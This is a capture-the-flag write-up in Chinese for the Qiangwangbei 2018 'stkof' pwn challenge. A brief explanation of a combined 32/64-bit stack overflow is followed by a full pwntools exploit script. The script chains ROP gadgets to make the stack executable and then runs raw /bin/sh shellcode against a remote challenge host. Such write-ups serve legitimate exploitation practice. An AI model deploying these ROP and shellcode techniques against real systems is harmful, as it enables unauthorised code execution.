---
title: 强网杯2018 stkof
categories: 
- 强网杯2018
---
# 强网杯2018 stkof

## 前言

打算做下拟态的两道题，这是第一题

## 漏洞利用

pwn1为32位，pwn2为64位，溢出点有错位，pwn1的rtn在pwn2的rbp里，使用add esp,0x100的gadgets让两块gadget区域分开，套路一致，先read改stack_prot为0x7，之后pop_eax放入stack_end，调用make_stack_executable使得栈可执行，call esp调用shellcode即可，中间调用no_nx的时候有点坑，要微调一下放入一个stack_end参数，方可使程序执行。

## exp.py

```py
#coding=utf-8
from pwn import *
context.terminal = ['tmux','split','-h']
context.log_level="DEBUG"
debug = 0
if debug == 1:
    context.update(arch='i386',os='linux')
    p = process('./pwn1')
elif debug == 2:
    context.update(arch='amd64',os='linux')
    p = process('./pwn2')
else:
    context.update(arch='i386',os='linux')
    p = remote('node2.buuoj.cn.wetolink.com',28459)

#i386
add_esp_0xa0 = 0x080a1728
add_esp_0xd4_p2 = 0x0809eb2f
add_esp_0x100 = 0x0806b225
stack_prot = 0x080d8fd0
stack_end = 0x080d8da8
p_eax = 0x080a8af6
mv_edx_eax = 0x08056a85
p_edx = 0x0806e9cb
no_nx = 0x0809d5d0
#bss_base = elf.bss()
bss_base = 0x080d7000
call_esp = 0x080add0f
read_addr = 0x0806c8e0
p3_ret = 0x0806a51d
dl_pagesize = 0x080d99f0
#amd64
sec_stack_prot = 0x6A0F10
sec_stack_end = 0x6a0ad0
sec_no_nx = 0x46b730
sec_read = 0x43b9c0
sec_p_rdi = 0x4005f6
sec_p_rdx_rsi = 0x43d9f9
sec_p_rax = 0x43b97c
sec_call_rsp = 0x47e1cb

def exp():
    p.recvuntil("We give you a little challenge, try to pwn it?")
    payload = 'a'*0x10c
    payload += p32(bss_base)
    payload += p32(add_esp_0x100)
    payload += 'a'*4
    #amd64
    #payload += 'a'*0xfc
    payload += p64(sec_p_rdi)+p64(0)
    payload += p64(sec_p_rdx_rsi)+p64(0x4)+p64(sec_stack_prot)
    payload += p64(sec_read)
    payload += p64(sec_p_rax)+p64(sec_stack_end)
    #sc_64 = asm(shellcraft.amd64.linux.sh())
    sc_64 = "\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05"
    payload += p64(sec_p_rdi)+p64(sec_stack_end)+p64(sec_no_nx)+p64(sec_call_rsp)+sc_64
    payload = payload.ljust(0xfc+0x118,'a')
    #i386
    #set prot
    payload += p32(read_addr)+p32(p3_ret)+p32(0)+p32(stack_prot)+p32(0x4)
    #payload += p32(p_eax)+p32(7)
    #payload += p32(p_edx)+p32(stack_prot)
    #payload += p32(mv_edx_eax)
    #set stack end
    payload += p32(p_eax)+p32(stack_end)
    payload += p32(no_nx)
    #
    #sc_32 = asm(shellcraft.i386.linux.sh())
    sc_32 = "\x33\xd2\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
    payload += p32(p_edx)+p32(stack_end)+p32(call_esp)
    payload += sc_32
    '''
    if debug == 1:
        gdb.attach(p,'b* 0x0804892f')
    elif debug == 2:
        gdb.attach(p,'b* 0x400b33')
    '''
    p.send(payload)
    raw_input()
    p.send(p32(0x7))
    p.interactive()

exp()
```
